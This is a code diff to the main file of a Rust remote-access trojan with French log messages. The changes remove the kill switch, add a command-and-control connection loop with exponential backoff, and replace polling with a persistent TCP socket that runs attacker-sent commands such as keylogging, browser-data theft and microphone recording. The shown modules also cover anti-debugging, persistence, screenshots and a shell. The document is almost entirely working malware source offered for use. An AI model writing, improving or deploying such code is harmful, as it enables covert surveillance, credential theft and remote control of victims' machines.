@@ -1,9 +1,8 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 mod anti_debug;
 mod browser_info;
 mod connexion;
 mod input;
-mod kill_switch;
 mod logs;
 mod mic_rec;
 mod network_scanner;
@@ -12,10 +11,10 @@ mod poly;
 mod screenshot;
 mod shell;
 
-use rand::Rng;
 use std::collections::HashSet;
 use tokio::task::JoinHandle;
 use single_instance::SingleInstance;
+use tokio::io::AsyncReadExt;
 
 #[tokio::main]
 async fn main() {
@@ -31,13 +30,36 @@ async fn main() {
     #[cfg(target_os = "linux")]
     persistance::setup_persistence_linux();
 
-    if kill_switch::check_ks().await {
-        eprintln!("Arrêt du programme : kill switch activé");
-        return;
-    }
 
     anti_debug::anti_debug_response();
+    
+    // Retry C2 connection with exponential backoff
+    let mut retry_count = 0;
+    let max_retries = 30;
+    let mut base_delay = std::time::Duration::from_secs(1);
+    
+    loop {
+        match connexion::connect_to_c2().await {
+            Ok(_) => {
+                println!("[+] Connecté au C2 après {} tentatives", retry_count);
+                break;
+            }
+            Err(e) => {
+                retry_count += 1;
+                if retry_count >= max_retries {
+                    eprintln!("[-] Impossible de se connecter au C2 après {} tentatives: {}", max_retries, e);
+                    return;
+                }
+                eprintln!("[-] Erreur connexion C2 (tentative {}): {}. Nouvelle tentative dans {:?}", retry_count, e, base_delay);
+                tokio::time::sleep(base_delay).await;
+                // Exponential backoff, max 60 seconds
+                base_delay = std::time::Duration::from_secs((base_delay.as_secs() * 2).min(60));
+            }
+        }
+    }
+    
     let _ = connexion::ping_c2().await;
+    println!("[+] Ping C2 envoyé");
 
     if let Some(cmd_map) = poly::get_command_map() {
         let mapping = connexion::CommandMapping {
@@ -52,8 +74,13 @@ async fn main() {
 
         if let Err(e) = connexion::send_mapping(&mapping).await {
             eprintln!("Erreur envoi mapping: {}", e);
+        } else {
+            println!("[+] Mapping envoyé avec succès");
         }
     }
+    
+    println!("[+] En attente de commandes...");
+
 
     let num_to_command = [
         ("1", "keylogger"),
@@ -63,71 +90,85 @@ async fn main() {
         ("5", "browser_info"),
         ("6", "mic_rec"),
     ];
-    let mut already_executed: HashSet<String> = HashSet::new();
-    let always_run: [&'static str; 1] = ["keylogger"];
-    let mut running_tasks: HashSet<String> = HashSet::new();
 
     loop {
-        match connexion::get_directives().await {
-            Ok(commands) => {
-                println!("Commands received: {:?}", commands);
-                let mut handles: Vec<JoinHandle<()>> = Vec::new();
-                let mut already_in_queue: HashSet<String> = HashSet::new();
-                for command in commands {
-                    // Gestion du stop
-                    if let Some(num) = command.strip_prefix("stop ") {
-                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num)
-                        {
-                            println!("Arrêt demandé pour {}", cmd_name);
-                            if *cmd_name == "keylogger" {
-                                input::stop_keylogger();
-                            }
-                            if *cmd_name == "mic_rec" {
-                                mic_rec::stop_mic_rec();
-                            }
-                            already_executed.remove(&cmd_name.to_string());
-                            running_tasks.remove(&cmd_name.to_string());
-                            let _ = connexion::send_directive_status(
-                                command.as_str(),
-                                "success",
-                                "Session terminée",
-                            )
-                            .await;
-                        } else {
-                            println!("Numéro de fonctionnalité inconnu pour stop: {}", num);
-                        }
-                        continue;
-                    }
-
-                    if always_run.contains(&command.as_str()) && running_tasks.contains(&command) {
-                        continue;
-                    }
-
-                    if !always_run.contains(&command.as_str())
-                        && already_in_queue.contains(&command)
-                    {
-                        continue;
-                    }
-
-                    if !always_run.contains(&command.as_str()) {
-                        already_in_queue.insert(command.clone());
-                    } else {
-                        running_tasks.insert(command.clone());
-                    }
-
-                    let cmd = command.clone();
-                    let handle = tokio::spawn(async move {
-                        poly::execute_poly_command(&cmd).await;
-                    });
-                    handles.push(handle);
+        let mut buffer = vec![0; 8192];
+        let mut socket_guard = connexion::TCP_SOCKET.lock().await;
+        
+        if let Some(socket) = &mut *socket_guard {
+            match socket.read(&mut buffer).await {
+                Ok(0) => {
+                    eprintln!("[-] Connexion au serveur fermée");
+                    drop(socket_guard);
+                    break;
                 }
-                for handle in handles {
-                    tokio::spawn(handle).await.ok();
+                Ok(n) => {
+                    let data = String::from_utf8_lossy(&buffer[..n]);
+                    println!("[DEBUG] Données reçues ({}): {}", n, data);
+                    
+                    if let Ok(json) = serde_json::from_str::<serde_json::Value>(&data) {
+                        println!("[DEBUG] JSON parsé: {:?}", json);
+                        if let Some(commands_array) = json.get("commands").and_then(|v| v.as_array()) {
+                            let commands: Vec<String> = commands_array
+                                .iter()
+                                .filter_map(|v| v.as_str().map(String::from))
+                                .collect();
+                            
+                            drop(socket_guard);
+                            
+                            println!("[+] Commands received: {:?}", commands);
+                            let mut handles: Vec<JoinHandle<()>> = Vec::new();
+                            let mut already_in_queue: HashSet<String> = HashSet::new();
+                            
+                            for command in commands {
+                                if let Some(num) = command.strip_prefix("stop ") {
+                                    if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num)
+                                    {
+                                        println!("[+] Arrêt demandé pour {}", cmd_name);
+                                        if *cmd_name == "keylogger" {
+                                            input::stop_keylogger();
+                                        }
+                                        if *cmd_name == "mic_rec" {
+                                            mic_rec::stop_mic_rec();
+                                        }
+                                        let _ = connexion::send_directive_status(
+                                            &format!("stop {}", num),
+                                            "success",
+                                            "Session terminée",
+                                        )
+                                        .await;
+                                    }
+                                    continue;
+                                }
+
+                                if already_in_queue.contains(&command) {
+                                    continue;
+                                }
+
+                                already_in_queue.insert(command.clone());
+
+                                let cmd = command.clone();
+                                let handle = tokio::spawn(async move {
+                                    poly::execute_poly_command(&cmd).await;
+                                });
+                                handles.push(handle);
+                            }
+                            for handle in handles {
+                                let _ = handle.await;
+                            }
+                        } else {
+                            println!("[DEBUG] Pas de champ 'commands' dans le JSON");
+                        }
+                    } else {
+                        println!("[DEBUG] Erreur parsing JSON: {}", data);
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Erreur lecture: {}", e);
+                    drop(socket_guard);
+                    break;
                 }
             }
-            Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
         }
-        let delay = rand::rng().random_range(5..15);
-        tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
     }
 }
